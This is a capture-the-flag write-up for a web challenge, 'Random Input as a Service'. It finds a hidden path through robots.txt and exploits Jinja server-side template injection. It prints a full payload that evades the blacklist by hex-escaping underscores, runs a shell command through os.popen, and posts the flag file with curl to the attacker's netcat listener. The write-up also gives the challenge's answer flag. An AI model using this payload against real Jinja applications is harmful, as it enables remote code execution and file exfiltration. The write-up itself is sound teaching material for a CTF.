# RIaaS | NoobMaster and hacker_of_india
Just a note, The idea of ssti and robots.txt was given by hacker_of_india, I combined both of them and added a blacklist and some more stuff

- Description : Welcome to Random Input as a Service!
no source given
- Hint : Jinja's most common vulnreability

remote:http://167.99.154.216:3050
# Write up
Login page is lost, as soon you see the word robot the first thing in your mind is robots.txt, and that gives you /nottheflaglol
You will find SSTI in the input field(if you don't then using the hint you surely will) and looking at the source at / we can see that they have a blacklist
```html
<!-- We have a blacklist to keep those sneaky hackers away! -->
```
so know after some playing around you will find out that `{{`, `}}` and `_` is blacklisted and you also need curl in your input so this is our final payload - 
```{% if request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('curl http://<your_ip>:9001 -d @flag')['read']() == 'a' %} {% endif %}```
the \x5f for a `_` and if statement so that we can use `{%` instead of `{{`. but before inputting, do - 
```bash
nc -lvnp 9001
```
and once you input you will see the website is not loading but then check your terminal it will have the flag!
Very very useful resource:
https://hackmd.io/@Chivato/HyWsJ31dI
# Flag - n00bz{55t1_sur3_1s_4_h34d4ch3!}
